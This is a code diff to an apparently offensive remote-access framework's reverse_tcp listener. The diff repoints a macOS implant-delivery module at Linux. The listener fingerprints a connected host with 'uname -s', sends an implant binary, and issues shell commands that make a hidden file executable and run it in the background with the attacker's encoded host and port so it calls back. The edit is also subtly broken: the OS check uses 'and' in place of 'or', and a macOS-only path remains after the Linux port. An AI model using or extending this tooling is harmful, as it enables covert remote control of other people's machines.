@@ -33,7 +33,7 @@ from core.helper import helper
 from core.exceptions import exceptions
 from core.io import io
 
-from data.macos.zeterpreter.reverse_tcp.core.terminator import terminator
+from data.linux.zeterpreter.reverse_tcp.core.terminator import terminator
 
 class listener:
     def __init__(self):
@@ -68,13 +68,13 @@ class listener:
             client.send("uname -s\n".encode())
             device_os = client.recv(128).decode().strip()
 
-            if device_os != "Darwin" and device_arch != "x86_64":
+            if device_os != "Linux" and device_arch != "x86_64":
                 self.badges.output_error("Unsupported system!")
                 raise exceptions.GlobalException
 
-            self.badges.output_process("Sending macOS implant...")
-            if os.path.exists("data/macos/zeterpreter/reverse_tcp/bin/implant"):
-                implant_file = open("data/macos/zeterpreter/reverse_tcp/bin/implant", "rb")
+            self.badges.output_process("Sending Linux implant...")
+            if os.path.exists("data/linux/zeterpreter/reverse_tcp/bin/implant"):
+                implant_file = open("data/linux/zeterpreter/reverse_tcp/bin/implant", "rb")
                 executable = implant_file.read()
                 implant_file.close()
                 instructions = ""
@@ -82,9 +82,9 @@ class listener:
                 instructions += f"chmod 777 /private/var/tmp/.implant;"
                 instructions += f"sh -c '/private/var/tmp/.implant {self.terminator.encode_remote_data(local_host, str(local_port))}' 2>/dev/null &"
                 instructions += "\n"
-                self.badges.output_process("Executing macOS implant...")
+                self.badges.output_process("Executing Linux implant...")
             else:
-                self.badges.output_error("Failed to send macOS implant!")
+                self.badges.output_error("Failed to send Linux implant!")
                 raise exceptions.GlobalException
 
             client.send(instructions.encode())
@@ -94,7 +94,7 @@ class listener:
             self.badges.output_process("Establishing connection...")
             client, address = server.accept()
             
-            from data.macos.zeterpreter.reverse_tcp.core.controller import controller
+            from data.linux.zeterpreter.reverse_tcp.core.controller import controller
             controller = controller(client)
 
             del server
